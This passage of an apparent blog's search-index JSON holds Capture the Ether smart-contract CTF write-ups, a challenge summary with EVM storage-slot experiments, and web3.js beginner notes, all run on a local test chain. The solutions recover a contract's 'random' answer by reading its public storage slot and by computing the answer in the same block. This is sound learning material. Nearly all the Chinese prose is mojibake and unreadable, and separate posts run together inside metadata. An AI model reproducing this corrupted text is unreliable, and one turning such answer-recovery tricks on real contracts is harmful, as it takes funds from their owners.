GuessTheNewNumberChallenge &#123; function GuessTheNewNumberChallenge() public payable &#123; require(msg.value == 1 ether); &#125; function isComplete() public view returns (bool) &#123; return address(this).balance == 0; &#125; function guess(uint8 n) public payable &#123; require(msg.value == 1 ether); uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now)); if (n == answer) &#123; msg.sender.transfer(2 ether); &#125; &#125;&#125; 2. åˆ†æ 2.1 åˆ†æä»£ç å¯çŸ¥ï¼Œansweræ˜¯åœ¨æ‰§è¡Œ guess å‡½æ•°çš„ä¹‹åæ‰ä¼šè¢«èµ‹å€¼ï¼Œä¹Ÿå°±æ˜¯è¯´ä¸èƒ½ç›´æ¥é€šè¿‡ web3 å’Œåˆçº¦äº¤äº’è·å– answer ï¼Œä½†æ˜¯æˆ‘ä»¬çŸ¥é“åŒä¸€å—åŒºå—ä¸­çš„æ—¶é—´æˆ³æ˜¯åŒä¸€ä¸ªï¼Œä¹Ÿå°±æ˜¯è¯´è®© guess å‡½æ•°å’Œè‡ªå·±çš„ç­”æ¡ˆåœ¨åŒä¸€ä¸ªåˆçº¦ä¸­ 2.1 ä»€ä¹ˆæ„æ€å‘¢ï¼Œç®€å•æ¥è¯´å°±æ˜¯ answer çš„å®šä¹‰ä¸ºï¼š uint8 answer = uint8(uint256(keccak256(block.blockhash(block.number - 1), now))); (å…¶ä¸­ now å°±æ˜¯æ—§ç‰ˆæœ¬çš„æ—¶é—´æˆ³ï¼Œç°åœ¨è·å–æ—¶é—´æˆ³çš„æ–¹æ³•æ˜¯ï¼šblock.timestamp ) 3. è§£é¢˜","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"capther the ether","slug":"Smart-contracts/capther-the-ether","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/capther-the-ether/"}],"tags":[{"name":"é¶åœº","slug":"é¶åœº","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"},{"name":"soliditiy","slug":"soliditiy","permalink":"https://biyouqiuqiu.com/tags/soliditiy/"}]},{"title":"Guess the random number","slug":"Smart contracts/capther the ether/Guess the random number","date":"2023-04-05T04:59:10.000Z","updated":"2023-04-05T04:59:10.000Z","comments":true,"path":"2023/04/05/Smart contracts/capther the ether/Guess the random number/","link":"","permalink":"https://biyouqiuqiu.com/2023/04/05/Smart%20contracts/capther%20the%20ether/Guess%20the%20random%20number/","excerpt":"","text":"Guess the random number1. é¢˜ç›® 1.1 This time the number is generated based on a couple fairly random sources 1.2 é¢˜ç›®ä»£ç ï¼š 1234567891011121314151617181920212223// SPDX-License-Identifier: MITpragma solidity ^0.4.21;contract GuessTheRandomNumberChallenge &#123; uint8 answer; function GuessTheRandomNumberChallenge() public payable &#123; require(msg.value == 1 ether); answer = uint8(keccak256(block.blockhash(block.number - 1), now)); &#125; function isComplete() public view returns (bool) &#123; return address(this).balance == 0; &#125; function guess(uint8 n) public payable &#123; require(msg.value == 1 ether); if (n == answer) &#123; msg.sender.transfer(2 ether); &#125; &#125;&#125; 2. åˆ†æ 2.1 é¢˜ç›®ä»£ç ä¸­çš„ answer æ˜¯éšæœºç”Ÿæˆçš„ï¼ŒåŠæ ¹æ®åˆ›å»ºçš„æ—¶å€™åŒºå—å·å’Œå½“æ—¶çš„æ—¶é—´ now æ¥æ‰“çš„æ—¶é—´æˆ³ã€‚ 2.2 åŒºå—é“¾é“¾ä¸Šçš„æ‰€æœ‰å†…å®¹éƒ½æ˜¯å…¬å¼€çš„ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨ä¸åˆçº¦äº¤äº’ï¼Œè·å–åˆ°åˆçº¦ä¸Šå­˜å‚¨çš„å€¼ 2.3 åˆå› ä¸ºåˆçº¦ä¸­åªæœ‰ä¸€ä¸ªå˜é‡ï¼ŒåŠç´¢å¼•ä¸º 0 ä½ç½®çš„å€¼ï¼Œä¾¿æ˜¯æˆ‘çš„ç­”æ¡ˆanswer 1var contract = new web.eth.Contract(contract_abi,contract_add); tips: ä¸ºäº†å¼„æ‡‚è¿™ä¸ªå­˜å‚¨ä½ç½®ï¼Œæˆ‘è¿˜ç‰¹æ„å»é˜…è¯»ç›¸å…³æ–‡çŒ®äº†è§£äº†EVMçš„å­˜å‚¨ä½ç½®å’ŒåŸç†ï¼Œç›¸å…³æ–‡ç« åœ¨è¿™ ï¼š storage-slotå­˜å‚¨æ‹“å±• 3. è§£é¢˜ 3.1 ç”¨ jsä»£ç  å®ç° web3 ä¸åˆçº¦çš„äº¤äº’ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758let Web3 = require(&quot;web3&quot;);web = new Web3(new Web3.providers.HttpProvider(&quot;Http://127.0.0.1:7545&quot;));// console.log(web.currentProvider);// remix ä¸Šéƒ¨ç½²çš„åˆçº¦åœ°å€var contract_add = &quot;0x4DB61fCf9a56da7575e38f68BAf8E1621513001a&quot;;// åœ¨remix ä¸Šè·å–çš„ ABIvar contract_abi = [ &#123; &quot;constant&quot;: false, &quot;inputs&quot;: [ &#123; &quot;name&quot;: &quot;n&quot;, &quot;type&quot;: &quot;uint8&quot; &#125; ], &quot;name&quot;: &quot;guess&quot;, &quot;outputs&quot;: [], &quot;payable&quot;: true, &quot;stateMutability&quot;: &quot;payable&quot;, &quot;type&quot;: &quot;function&quot; &#125;, &#123; &quot;inputs&quot;: [], &quot;payable&quot;: true, &quot;stateMutability&quot;: &quot;payable&quot;, &quot;type&quot;: &quot;constructor&quot; &#125;, &#123; &quot;constant&quot;: true, &quot;inputs&quot;: [], &quot;name&quot;: &quot;isComplete&quot;, &quot;outputs&quot;: [ &#123; &quot;name&quot;: &quot;&quot;, &quot;type&quot;: &quot;bool&quot; &#125; ], &quot;payable&quot;: false, &quot;stateMutability&quot;: &quot;view&quot;, &quot;type&quot;: &quot;function&quot; &#125;];// åˆ›å»ºåˆçº¦å®ä¾‹var contract = new web.eth.Contract(contract_abi,contract_add);// console.log(contract);web.eth.getStorageAt(contract_add,0,(error,result) =&gt; &#123; // å°†ç»“æœçš„ 16 è¿›åˆ¶æ•°è½¬åŒ–ä¸º 10è¿›åˆ¶ var answer = web.utils.hexToNumber(result); //è¾“å‡ºç»“æœ console.log(&quot;å­˜å‚¨ä¸ºï¼š&quot;,answer)&#125;) 3.2 åœ¨æ§åˆ¶å°è·å– åˆçº¦ çš„ answer 3.3 åœ¨ remix ä¸­éªŒè¯ 3.4 ç»“æœæ­£ç¡®","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"capther the ether","slug":"Smart-contracts/capther-the-ether","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/capther-the-ether/"}],"tags":[{"name":"é¶åœº","slug":"é¶åœº","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"},{"name":"soliditiy","slug":"soliditiy","permalink":"https://biyouqiuqiu.com/tags/soliditiy/"}]},{"title":"capther the etheræ€»ç»“","slug":"Smart contracts/capther the ether/capther the etheræ€»ç»“","date":"2023-04-03T02:39:10.000Z","updated":"2023-04-03T02:39:10.000Z","comments":true,"path":"2023/04/03/Smart contracts/capther the ether/capther the etheræ€»ç»“/","link":"","permalink":"https://biyouqiuqiu.com/2023/04/03/Smart%20contracts/capther%20the%20ether/capther%20the%20ether%E6%80%BB%E7%BB%93/","excerpt":"","text":"capther the etheræ€»ç»“1. Guess the secret number 1.1 å­¦ä¼šäº†å¦‚ä½•ä½¿ç”¨æš´åŠ›ç ´è§£ 2. Guess the random number 2.1 äº†è§£äº†äº› EVMçš„å­˜å‚¨çš„åŸç†ï¼Œæ™ºèƒ½åˆçº¦ä¸Šå…¨å±€å˜é‡çš„å­˜è´®ä½ç½®ï¼Œé€‚å½“å­¦ä¼šäº†å¦‚ä½•å–å‡ºæ¥ 2.2 é‡‡ç”¨web3 å’Œæ™ºèƒ½åˆçº¦äº¤äº’ï¼Œè·å–å­˜å‚¨çš„æ‰€éœ€å€¼ 12345var answer;web.eth.getStorageAt(contractADD,0,(err,result)=&gt;&#123; answer = web.utils.hexToNumber(result); console.log(answer);&#125;) 3. Guess the new number 3.1 çŸ¥é“äº†åˆçº¦éƒ¨ç½²çš„æ—¶å€™ï¼Œå…¨å±€å˜é‡ä¼šè¢«èµ‹å€¼æˆ–è€…åˆå§‹åŒ–ï¼Œä½†æ˜¯å‡½æ•°ä½“é‡Œçš„åˆ™ä¸ä¼šè¢«èµ‹å€¼æˆ–è€…åˆå§‹åŒ–ï¼Œåªæœ‰å½“å‡½æ•°è¢«è°ƒç”¨çš„æ—¶å€™æ‰ä¼š 3.2 çŸ¥é“äº†å½“ä¸€ä¸ªåˆçº¦è°ƒç”¨å¦ä¸€ä¸ªåˆçº¦çš„æ—¶å€™ä¼šåœ¨åŒä¸€å—åŒºå—æ‰§è¡Œï¼Œä¹Ÿå°±æ˜¯è¯´ åˆçº¦ä¹‹é—´çš„è°ƒç”¨æ˜¯åœ¨åŒä¸€ä¸ªåŒºå—å½“ä¸­çš„ åˆå› ä¸º åŒä¸€åŒºå—ä¸­çš„æ—¶é—´æˆ³æ˜¯ç›¸åŒçš„ æ‰€ä»¥å¯ä»¥æ¨å‡º å¯ä»¥åœ¨æ”»å‡»åˆçº¦è°ƒç”¨ æ‰€éœ€çš„æ–¹æ³•ç„¶ååŸåˆçº¦ä¸­å‡½æ•°çš„å±€éƒ¨å˜é‡ answer æ ¹æ®æ”»å‡»åˆçº¦çš„æ—¶é—´æˆ³ç”Ÿæˆç›¸å¯¹åº”çš„ answer è¿™æ ·ä¸€æ¥æˆ‘ä»¬å°±å¯ä»¥ç›´æ¥å°†è·å–åˆ° answer 4. Predict the future5.Predict the block hash6. Token sale7. Token whale8. Mapping 8.1 çŸ¥é“äº†ä¸€ä¸ªåˆçº¦èƒ½å¤Ÿå­˜å‚¨çš„æ•°æ®å¤§å°ä¸º 9.Donation 9.1 æ¢ç©¶äº†ä¸€ä¸‹ memory å’Œ storage å¯¹ ç»“æ„ä½“çš„å­˜å‚¨ä½ç½®çš„å½±å“ éªŒè¯çŒœæƒ³çš„åˆçº¦ï¼š 1234567891011121314151617181920212223242526272829303132contract StorageTest1 &#123; uint256 a; // slot 0 address owner; // slots 1 struct Entry &#123; uint256 id; uint256 value; &#125; Entry c; // slots 2-3&#125;contract StorageTest2 &#123; struct Entry &#123; uint256 id; uint256 value; &#125; uint256 a=10; // slot 0 address owner=&quot;0x5B38Da6a701c568545dCfcB03FcB875f56beddC4&quot;; // slots 1 // æˆ‘æƒ³çŸ¥é“æ˜¯ä¸æ˜¯æ‰§è¡Œfå‡½æ•°ä¹‹åslot0 ä½ç½®çš„a å’Œ slot1ä½ç½®çš„owner è¢« entry.id å’Œ entry.valueçš„å€¼ç»™è¦†ç›– function f() public payable &#123; Entry entry; entry.id = 20; entry.value = 666; &#125;&#125; 9.2 ä½¿ç”¨web3è¿›è¡Œäº¤äº’ï¼Œè·å– StorageTest2 åˆçº¦éƒ¨ç½²å¥½ä¹‹å slot0 å’Œ slot1 å­˜å‚¨çš„å€¼æ˜¯ä»€ä¹ˆ web3æµ‹è¯•çŒœæƒ³ çš„ä»£ç å¦‚ä¸‹ï¼š 1234567891011121314151617let Web3 = require(&quot;web3&quot;);web = new Web3(new Web3.providers.HttpProvider(&quot;Http://127.0.0.1:8545&quot;));var fs = require(&quot;fs&quot;);var ABI = JSON.parse(fs.readFileSync(&quot;D:\\\\VSCode\\\\VSCode_Data\\\\Web3Workspace\\\\js\\\\lesson_online\\\\temp\\\\StorageTest2.abi&quot;),toString());var address = &quot;0x52fE4CEafD8e3c717008aC100224e7b4e94BfB8F&quot;;var contract = new web.eth.Contract(ABI,address);web.eth.getStorageAt(address,0,(err,slot0)=&gt;&#123; console.log(&quot;The getStorageAt slot0 is =&gt; &quot; + slot0);&#125;)web.eth.getStorageAt(address,1,(err,slot1)=&gt;&#123; console.log(&quot;The getStorageAt slot1 is =&gt; &quot; + slot1);&#125;) ç»“æœæ˜¯ï¼š 9.3 å½“æˆ‘åœ¨remixä¸Šæ‰§è¡Œfå‡½æ•°åï¼Œå†æŸ¥çœ‹ slot0 å’Œ slot1çš„å€¼ å¯ä»¥æ˜æ˜¾å‘ç°åŸæ¥æ’æ§½ 0 å’Œ 1 ä½ç½®çš„å€¼å·²ç»è¢«è¦†ç›–äº† 9.4 æµ‹è¯•ä¸€ä¸‹ç»“æ„ä½“å’Œå…¨å±€å£°æ˜ä½ç½®ä¸åŒä¼šä¸ä¼šå½±å“å­˜å‚¨ä½ç½® ç»“æ„ä½“å£°æ˜åœ¨å…¨å±€å˜é‡ä¹‹å åˆçº¦ä»£ç ï¼š 1234567891011121314151617181920pragma solidity ^0.4.21;contract StorageTest &#123; uint256 a = 9; uint256[2] b = [1,2]; struct Entry &#123; uint256 id; address value; &#125; Entry c; function f() public &#123; Entry c; c.id = 3; c.value = 0x3C061FCEb96fca484e8c55C204BAd35C6fE2CE0f; &#125;&#125; web3äº¤äº’çš„ä»£ç ï¼š 1234567891011121314151617181920212223242526272829let Web3 = require(&quot;web3&quot;);web = new Web3(new Web3.providers.HttpProvider(&quot;Http://127.0.0.1:8545&quot;));var fs = require(&quot;fs&quot;);var ABI = JSON.parse(fs.readFileSync(&quot;D:\\\\VSCode\\\\VSCode_Data\\\\Web3Workspace\\\\js\\\\lesson_online\\\\temp\\\\StorageTest2.abi&quot;),toString());var address = &quot;0xEA34F5801A19Db18b9DFE4f5D62F669d673ec605&quot;;var contract = new web.eth.Contract(ABI,address);web.eth.getStorageAt(address,0,(err,slot0)=&gt;&#123; console.log(&quot;The getStorageAt slot0 is =&gt; &quot; + slot0);&#125;)web.eth.getStorageAt(address,1,(err,slot1)=&gt;&#123; console.log(&quot;The getStorageAt slot1 is =&gt; &quot; + slot1);&#125;)web.eth.getStorageAt(address,2,(err,slot2)=&gt;&#123; console.log(&quot;The getStorageAt slot2 is =&gt; &quot; + slot2);&#125;)web.eth.getStorageAt(address,3,(err,slot3)=&gt;&#123; console.log(&quot;The getStorageAt slot3 is =&gt; &quot; + slot3);&#125;)web.eth.getStorageAt(address,4,(err,slot4)=&gt;&#123; console.log(&quot;The getStorageAt slot4 is =&gt; &quot; + slot4);&#125;) è¿™æ˜¯æµ‹è¯•ç»“æœ: ç»“æ„ä½“å£°æ˜åœ¨å…¨å±€å˜é‡ä¹‹å‰ï¼š åˆçº¦ä»£ç ï¼š 1234567891011121314151617181920pragma solidity ^0.4.21;contract StorageTest &#123; struct Entry &#123; uint256 id; address value; &#125; Entry c; uint256 a = 9; uint256[2] b = [1,2]; function f() public &#123; Entry c; c.id = 3; c.value = 0x3C061FCEb96fca484e8c55C204BAd35C6fE2CE0f; &#125; &#125; æµ‹è¯•ç»“æœï¼š ç»“è®ºï¼šåœ¨åˆçº¦å®šä¹‰çš„å…¨å±€å˜é‡ä¼šæ ¹æ®ä½ åœ¨åˆçº¦ä¸­å£°æ˜çš„å…ˆåé¡ºåºæ¥åˆ†é…å­˜å‚¨ä½ç½®ï¼ˆå³slot0ã€slot1ï¼‰è¿™äº›ï¼Œä½†æ˜¯åœ¨å‡½æ•°ä½“ä¸­ï¼Œå¦‚æœæœ‰ç»“æ„ä½“ç±»å‹çš„ç”³æ˜ï¼Œä¸”å­˜å‚¨ç±»å‹ä¸ºé»˜è®¤æˆ–ä¸º storage éƒ½ä¼šå¯¹å¯¹åŸæ¥çš„å­˜å‚¨ä½ç½®çš„å€¼è¿›è¡Œè¦†ç›– 10.Fifty years11.Fuzzy identity12.Public key13.Account Takeover14.Assume ownership15.Token bank","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"capther the ether","slug":"Smart-contracts/capther-the-ether","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/capther-the-ether/"}],"tags":[{"name":"é¶åœº","slug":"é¶åœº","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"},{"name":"soliditiy","slug":"soliditiy","permalink":"https://biyouqiuqiu.com/tags/soliditiy/"},{"name":"captheræ€»ç»“","slug":"captheræ€»ç»“","permalink":"https://biyouqiuqiu.com/tags/capther%E6%80%BB%E7%BB%93/"}]},{"title":"web3_self","slug":"Web3/Basic_Knowledge/web3_self","date":"2023-04-01T02:47:10.000Z","updated":"2023-04-01T02:47:10.000Z","comments":true,"path":"2023/04/01/Web3/Basic_Knowledge/web3_self/","link":"","permalink":"https://biyouqiuqiu.com/2023/04/01/Web3/Basic_Knowledge/web3_self/","excerpt":"","text":"web3_day01å­¦ä¹ èµ„æºè§†é¢‘å®˜æ–¹æ–‡æ¡£å¥½æ–‡æ¡£1. Web3.js çš„å®‰è£…1.1 node.js çš„ä¸‹è½½å®‰è£…åŠé…ç½®ï¼š å‚è€ƒåšå®¢1.2 åœ¨ VSCode ä¸­å®‰è£…æ’ä»¶ ï¼š code runner 2. ä¸‹è½½å®‰è£…ä½¿ç”¨Ganacheç½‘ä¸Šæœä¸€ä¸‹å°±æœ‰äº†ï¼Œå»ºè®®è‡ªå·±åˆ›å»ºä¸€ä¸ªå·¥ä½œçš„ç©ºé—´ï¼Œè¿™æ ·ä¹‹å‰æ“ä½œ çš„äº¤æ˜“ä¿¡æ¯å°±ä¼šè¢«ä¿ç•™ä¸‹æ¥ã€‚ 3. è·Ÿç€è§†é¢‘æ•²ä»£ç 3.1 è§†é¢‘ä¸­çš„ä»£ç ï¼š123let Web3 = require(&#x27;web3&#x27;);web3 = new Web3(new Web3.providers.HttpProvider(&quot;Http://127.0.0.1:7545&quot;));console.log(web3); åˆ†æï¼š è§£è¯»ï¼šç¬¬ä¸€è¡Œä¸­çš„ require(&#39;web3&#39;) web3æ˜¯åº“ä¸­çš„åå­—ï¼Œæˆ‘ä»¥ä¸ºæ˜¯è‡ªå®šä¹‰çš„ï¼Œå°è¯•æ”¹æˆå…¶ä»–åå­—æŠ¥é”™å¦‚ä¸‹ï¼š å˜é‡å web3 å®¹æ˜“å’Œç¬¬ä¸€è¡Œä¸­çš„ â€˜web3â€™ ææ··ï¼Œæ‰€ä»¥è‡ªå·±æ¢äº†ä¸€ä¸ªå˜é‡å è‡ªå·±çš„ä»£ç ï¼š 123let Web3 = require(&#x27;web3&#x27;);web = new Web3(new Web3.providers.HttpProvider(&quot;Http://127.0.0.1:7545&quot;));console.log(web); 4. å­æ¨¡å—åˆ—è¡¨ åœ¨æ‰§è¡Œè¿™æ®µä»£ç çš„æ—¶å€™ï¼Œå‡ºç°äº†é”™è¯¯ ä»£ç ï¼š 1234let Web3 = require(&#x27;web3&#x27;);web = new Web3(new Web3.providers.HttpProvider(&quot;Http://127.0.0.1:7545&quot;));web.eth.getNodeInfo().then(console.log); è§£è¯»ï¼š å®˜æ–¹æ–‡æ¡£ä¸Šçš„åŸå‡½æ•°æ˜¯è¿™æ ·è¿™æ ·å†™çš„: web3.eth.getNodeInfo([callback]); è€å¸ˆçš„å†™æ³•æ˜¯ï¼š web.eth.getNodeInfo().then(); è€å¸ˆè¯´æ˜¯ä¸€æ ·çš„ï¼Œ.then çš„æ„æ€æ˜¯ï¼šæ‰§è¡Œå®Œweb.eth.getNodeInfo() ä¹‹åï¼Œå†å»æ‰§è¡Œ .then() æ‹¬å·é‡Œçš„ä»£ç ï¼Œå³ console.log ã€‚ é”™è¯¯ï¼š è§£å†³æ–¹æ¡ˆï¼š æ‰“å¼€èœå•é€‰é¡¹ï¼Œæ‰¾åˆ°ä¹‹å‰å®‰è£…çš„ Ganacheï¼Œå¯åŠ¨å®ƒå³å¯ï¼Œç„¶åå†æ¬¡è¿è¡Œä»£ç  æ€»ç»“ï¼šå¦‚æœæŠŠ Ganache å…³é—­äº†ï¼Œä»£ç åˆæ˜¯ä¸èƒ½è¿è¡Œçš„ï¼Œåªæœ‰å°† Gannache ä¸€ç›´å¼€ç€çš„ï¼Œæ‰å¯ä»¥æ­£å¸¸è¿è¡Œï¼Œä½†æ˜¯ ä¸çŸ¥é‚£ä¸€å¤§ä¸²æ˜¯ä»€ä¹ˆ 5. ç½‘ç»œçŠ¶æ€æŸ¥è¯¢5.1 æŸ¥çœ‹æ˜¯å¦è¿æ¥åˆ°èŠ‚ç‚¹ ï¼š web.eth.net.isListening().then(console.log); web.bzz.net.isListening().then(console.log); 5.2 è·å– Network ID (ç½‘ç»œå·) 6. providersç›¸å…³6.1 æŸ¥çœ‹ Web3 ä¸­æ‰€æœ‰å¯ç”¨çš„Providers ä»£ç ï¼š 123456789&gt;let Web3 = require(&#x27;web3&#x27;);&gt;web = new Web3(new Web3.providers.HttpProvider(&quot;Http://127.0.0.1:7545&quot;));&gt;// web.eth.getNodeInfo().then(console.log);&gt;// web.eth.net.isListening().then(console.log);&gt;// web.bzz.net.isListening().then(console.log);&gt;console.log(web.providers); è¿è¡Œç»“æœï¼š 6.2 æŸ¥çœ‹å½“å‰è®¾ç½®çš„ Web3 provider 6.3 æŸ¥çœ‹æµè§ˆå™¨ç¯å¢ƒè®¾ç½®çš„web3 provider 6.4 è®¾ç½®&#x2F; ä¿®æ”¹ provider 7. æ‰¹å¤„ç†è¯·æ±‚7.1 å°†å‘å¸ƒåˆçº¦åˆ°æµ‹è¯•ç½‘ é‡å¤´æˆï¼ï¼ï¼çœ‹åˆ°è¿™ä¸ªç•Œé¢ï¼Œæˆ‘å°±çŸ¥é“ï¼Œæˆ‘åˆå¯ä»¥å­¦åˆ°ä¸œè¥¿äº† åŸæ¥æ˜¯æ˜¯è¿™æ ·è¿æ¥æœ¬åœ°çš„è´¦æˆ·ï¼Œç›´æ¥æƒŠå‘†ï¼ æ–¹æ³•ä¸€ï¼š â‘  æ‰“å¼€remixï¼Œé€‰æ‹©è¿™ä¸¤ä¸ªå…¶ä¸­ä¹‹ä¸€ï¼š â‘¡ å°†è‡ªå·±æœ¬åœ°çš„ç«¯å£å·å¡«å…¥ï¼š â‘¢ ç„¶åå°±å‘ˆç°å¦‚ä¸‹ç•Œé¢ï¼š â‘£ æœ¬åœ°è´¦æˆ·å’Œremix ä¸­çš„ è´¦æˆ·ä¸€ä¸€å¯¹åº”ï¼š æ–¹æ³•äºŒï¼šåµŒå…¥å¼è¿æ¥ â‘  æ·»åŠ ç½‘ç»œ â‘¡ å’Œ remix å»ºç«‹è¿æ¥ æ­¤æ—¶å½“å‰ç½‘ç»œé’±åŒ…æ²¡é’± â‘¢ é€šè¿‡ç§é’¥å¯¼å…¥æœ¬åœ°è´¦æˆ· â‘£ å¯¼å…¥æˆåŠŸä¹‹åï¼Œå°±å¯ä»¥åœ¨remix ä¸­åŒæ­¥è´¦æˆ·ä½™é¢ â‘¤ å¯ä»¥æµ‹è¯•ä¸€ä¸‹ï¼Œæ˜¯å¦èƒ½æ­£å¸¸ä½¿ç”¨ï¼Œç»“æœæ˜¯ ok æ»´ â‘¥ åœ¨æœ¬åœ°å¯ä»¥æŸ¥çœ‹ remixéƒ¨ç½²çš„åˆçº¦ 7.2 å¤åˆ¶ABI å’Œ åœ°å€åˆ°ç¨‹åºä¸­ â‘  å¤åˆ¶ remix ä¸­çš„ ABI â‘¡ åˆ°ä»£ç ç¨‹åºä¸­ï¼Œå®šä¹‰ä¸€ä¸ªå˜é‡ var abi,å¹¶å°†å¤åˆ¶çš„ABI ä½œä¸ºå€¼ï¼Œèµ‹ç»™ abi â‘¢ åˆ°remix ä¸­æ‹·è´åœ°å€ï¼Œå¹¶èµ‹äºˆ æˆ‘ä»¬è‡ªå®šä¹‰çš„å˜é‡ var address 1var address = &quot;0xA96406CE93aE4803F290dFAb2a54D4e9B050E239&quot;; â‘£ é€šè¿‡ ABI å’Œ åˆçº¦åœ°å€ å» åˆ›å»ºåˆçº¦å¯¹è±¡ 1var contract = new web.eth.Contract(abi,address); â‘¤ ç„¶åå°±æ˜¯æ˜¯ä¸€ç³»åˆ—çš„è°ƒç”¨æ“ä½œï¼ˆç›®å‰ä»£ç è¿˜ä¸æ˜¯å¾ˆæ‡‚ï¼‰ ä»£ç ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374let Web3 = require(&#x27;web3&#x27;);web = new Web3(new Web3.providers.HttpProvider(&quot;Http://127.0.0.1:7545&quot;));// web.eth.getNodeInfo().then(console.log);// web.eth.net.isListening().then(console.log);// web.bzz.net.isListening().then(console.log);// console.log(web.providers);// console.log(web);// console.log(Web3.modules);// console.log(Web3.version);// var web = new Web3(Web3.givenProvider || &quot;ws://localhost:8545&quot;);// console.log(web);var abi = [ &#123; &quot;inputs&quot;: [ &#123; &quot;internalType&quot;: &quot;uint256&quot;, &quot;name&quot;: &quot;_number&quot;, &quot;type&quot;: &quot;uint256&quot; &#125; ], &quot;name&quot;: &quot;setNumber&quot;, &quot;outputs&quot;: [], &quot;stateMutability&quot;: &quot;nonpayable&quot;, &quot;type&quot;: &quot;function&quot; &#125;, &#123; &quot;inputs&quot;: [], &quot;name&quot;: &quot;getNumber&quot;, &quot;outputs&quot;: [ &#123; &quot;internalType&quot;: &quot;uint256&quot;, &quot;name&quot;: &quot;&quot;, &quot;type&quot;: &quot;uint256&quot; &#125; ], &quot;stateMutability&quot;: &quot;view&quot;, &quot;type&quot;: &quot;function&quot; &#125;];// éƒ¨ç½²å‡ºæ¥çš„åˆçº¦åœ°å€var address = &quot;0xA96406CE93aE4803F290dFAb2a54D4e9B050E239&quot;;var contract = new web.eth.Contract(abi,address);function callBack1() &#123; console.log(&quot;callBack1() is running&quot;);&#125;function callBack2() &#123; console.log(&quot;callBack2() is running&quot;);&#125;var batch = new web.BatchRequest();// &quot;0x11e6df0756c5D6fCa1ca49b9d6227D49b93C746c&quot; æ˜¯å‡½æ•°è°ƒç”¨è€…çš„åœ°å€batch.add(web.eth.getBalance.request(&#x27;0x11e6df0756c5D6fCa1ca49b9d6227D49b93C746c&#x27;,&#x27;latest&#x27;,callBack1));batch.add(contract.methods.getNumber().call.request(&#123;from:&#x27;0x11e6df0756c5D6fCa1ca49b9d6227D49b93C746c&#x27;&#125;,callBack2));batch.add(contract.methods.getNumber().call.request(&#123;from:&#x27;0x11e6df0756c5D6fCa1ca49b9d6227D49b93C746c&#x27;&#125;,function(error,reusult)&#123; console.log(error); console.log(reusult);&#125;));batch.execute(); ç»“æœï¼š 8. å¤§æ•°æ®å¤„ç†ï¼ˆbigNumberï¼‰ã€‹ã€‹ã€‹å·¥å…·çš„æ–‡æ¡£åœ¨æ­¤å¤„8.1 ç®€ä»‹ æµ‹è¯•æ¡ˆä¾‹ï¼š 9. ä»¥å¤ªå•ä½è½¬æ¢9.1 web3.utils.fromWei æ³¨æ„ï¼šweb3.utils.fromWei(number,[unit])ä¸­çš„ number é€šå¸¸éƒ½æ˜¯ç”¨å­—ç¬¦ä¸²è¡¨ç¤ºï¼Œå¦‚æœç›´æ¥æ˜¯æ•°å­—çš„è¯å°±ä¼šæŠ¥é”™ ç¤ºä¾‹ï¼š 9.2 web3.utils.toWei 9.3 web3.utils.toHex æ¼”ç¤ºï¼š tips: è¿˜å¯ä»¥å°†å­—ç¬¦ä¸²è½¬æ¢ä¸º 16è¿›åˆ¶ 9.4 web3.utils.hexToNumberString æ¼”ç¤ºç¤ºä¾‹ï¼š 9.5 è¿˜æœ‰ä¸€äº›å…¶ä»–çš„è½¬åŒ– 10. åœ°å€ç›¸å…³çš„æ“ä½œ10.1 web3.isAddress ***è§£è¯»ï¼šä¸ºä»€ä¹ˆç¬¬äº”æ¡ä»£ç æ‰§è¡Œçš„ç»“æœä¸º falseï¼Ÿ *** å¯ä»¥å‚è€ƒæˆ‘åŒå­¦çš„åšå®¢ï¼š[26.checksum of address | solidity life (levi104.com)](https://www.levi104.com/2023/04/02/03.solidityè¿›é˜¶/26.checksum of address&#x2F;) 11. æŸ¥è¯¢åŒºå—ä¿¡æ¯11.1 æŸ¥è¯¢æœ€æ–°çš„åŒºå—å·(åŒºå—é«˜åº¦)â€“web3.eth.getBlockNumber() 11.2 æŸ¥è¯¢æœ€æ–°åŒºå—â€“ we3.eth.getBlock() 11.3 æŸ¥è¯¢åŒºå—ä¸­çš„äº¤æ˜“ â€“ web3.eth.getTransactionFromBlock() web3_day0212. web3.js äº¤æ˜“æ“ä½œ12.1 è´¦æˆ·ç›¸å…³12.1.1 æŸ¥è¯¢è´¦æˆ·ä¸ªæ•° â€“ web3.eth.getAccount() 12.1.2 æŸ¥è¯¢è´¦æˆ·ä¸ªæ•° â€“ web3.eth.getAccounts() 12.1.3 æŸ¥è¯¢coinbase â€“ web3.eth.getCoinbase() 12.2 äº¤æ˜“ç›¸å…³12.2.1 æŸ¥è¯¢ä½™é¢ â€“ web3.eth.getBalance() 12.2.2 æŸ¥è¯¢å¹³å‡ gas ä»·æ ¼ 123web3.eth.getGasPrice().then((result) =&gt; &#123; console.log(&quot;wei: &quot; + result);&#125;) å¯èƒ½æ˜¯æˆ‘æ²¡å­¦è¿‡å‰ç«¯å§ï¼Œè¿™ä¸ªå†™æ³•å±å®è®©æˆ‘éœ‡æƒŠã€‚ã€‚ã€‚ã€‚ã€‚ 12.3 äº¤æ˜“æ‰§è¡Œç›¸å…³12.3.1 å‘é€äº¤æ˜“ â€“ web3.eth.sendTransaction() çªå‘å¥‡æƒ³ï¼Œè¯•è¯•èƒ½ä¸èƒ½ç»™æˆ‘å¦ä¸€ä¸ªè´¦æˆ·è½¬é’± ä»£ç ï¼š 12345678910111213let Web3 = require(&quot;web3&quot;);web = new Web3(new Web3.providers.HttpProvider(&quot;Http://127.0.0.1:7545&quot;));// web.eth.getBlock(&quot;latest&quot;,true).then(console.log);var transactionObject = &#123; 